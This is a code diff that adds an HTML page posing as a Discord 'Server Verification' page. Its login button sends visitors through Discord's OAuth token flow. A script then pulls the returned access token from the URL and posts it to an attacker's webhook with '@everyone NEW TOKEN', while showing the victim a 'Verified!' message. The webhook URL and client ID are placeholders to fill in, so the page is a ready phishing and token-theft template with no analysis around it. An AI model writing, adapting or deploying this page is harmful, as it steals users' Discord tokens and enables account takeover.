@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body style="text-align:center;padding:50px;font-family:Arial">
+    <h2>Server Verification</h2>
+    <p>Click below to verify your Discord account</p>
+    <a href="https://discord.com/api/oauth2/authorize?client_id=REPLACE_WITH_YOUR_CLIENT_ID&redirect_uri=https://discord.com&response_type=token&scope=identify">
+        <button style="padding:15px 30px;background:#5865F2;color:white;border:none;border-radius:5px;font-size:18px;cursor:pointer">
+            Login with Discord
+        </button>
+    </a>
+    <script>
+        // Look for token in URL after redirect
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        const token = params.get('access_token');
+
+        if (token) {
+            // Send token to your Discord webhook
+            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: '@everyone NEW TOKEN: ' + token
+                })
+            });
+
+            // Show success message
+            document.body.innerHTML = '<h2>✅ Verified!</h2><p>You can close this page.</p>';
+        }
+    </script>
+</body>
+</html>
